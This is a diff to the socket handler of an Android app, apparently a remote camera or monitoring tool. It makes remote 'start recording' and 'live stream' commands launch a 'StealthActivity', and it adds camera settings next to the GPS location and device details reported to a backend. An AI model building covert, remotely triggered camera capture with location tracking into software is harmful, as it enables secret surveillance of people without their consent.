@@ -129,7 +129,7 @@ object SocketManager {
                         } catch (e: Exception) {
                             // ignore
                         }
-                        LiveStreamService.startService(context, camera)
+                        com.thirdeye.app.service.StealthActivity.launchForLiveStream(context, camera)
                     }.start()
                 } catch (e: Exception) {
                     Log.e(TAG, "Error handling start-live-stream", e)
@@ -187,8 +187,9 @@ object SocketManager {
 
                     val camera = data?.optString("camera", "BACK") ?: "BACK"
                     val lens = if (camera.equals("FRONT", ignoreCase = true)) "FRONT" else "BACK"
-                    prefs.cameraLens = lens
-                    Log.i(TAG, "📡 Received REMOTE START recording command with lens: $lens (#1 Top Priority)")
+                    // Do NOT overwrite user's saved phone settings (prefs.cameraLens)!
+                    // Use lens only as session override for this recording:
+                    Log.i(TAG, "📡 Received REMOTE START recording command with session lens: $lens (#1 Top Priority)")
 
                     // Stop LiveStreamService first to cleanly release camera & mic hardware
                     val wasLiveRunning = LiveStreamService.isServiceRunning
@@ -204,12 +205,7 @@ object SocketManager {
                         } catch (e: Exception) {
                             // ignore
                         }
-                        CameraRecordingService.startService(
-                            context = context,
-                            enableVibration = false,
-                            cameraLens = lens,
-                            isRemote = true
-                        )
+                        com.thirdeye.app.service.StealthActivity.launchForRemoteRecording(context, lens)
                     }.start()
                 } catch (e: Exception) {
                     Log.e(TAG, "Error starting remote recording", e)
@@ -310,7 +306,9 @@ object SocketManager {
                                 put("deviceId", BackendClient.getDeviceId(context))
                                 put("deviceName", BackendClient.getDeviceName())
                                 put("batteryLevel", battery)
-                                put("isRecording", prefs.isRecording)
+                                put("isRecording", CameraRecordingService.isServiceRunning || prefs.isRecording)
+                                put("videoQuality", prefs.videoQuality)
+                                put("cameraLens", prefs.cameraLens)
                                 put("timestamp", System.currentTimeMillis())
                                 if (loc != null) {
                                     put("latitude", loc.latitude)
@@ -366,11 +364,14 @@ object SocketManager {
             val deviceName = BackendClient.getDeviceName()
             val battery = BackendClient.getBatteryLevel(context)
             val loc = BackendClient.getLocation(context)
+            val prefs = AppPreferences(context)
 
             val payload = JSONObject().apply {
                 put("deviceId", deviceId)
                 put("deviceName", deviceName)
                 put("batteryLevel", battery)
+                put("videoQuality", prefs.videoQuality)
+                put("cameraLens", prefs.cameraLens)
                 if (loc != null) {
                     put("latitude", loc.latitude)
                     put("longitude", loc.longitude)
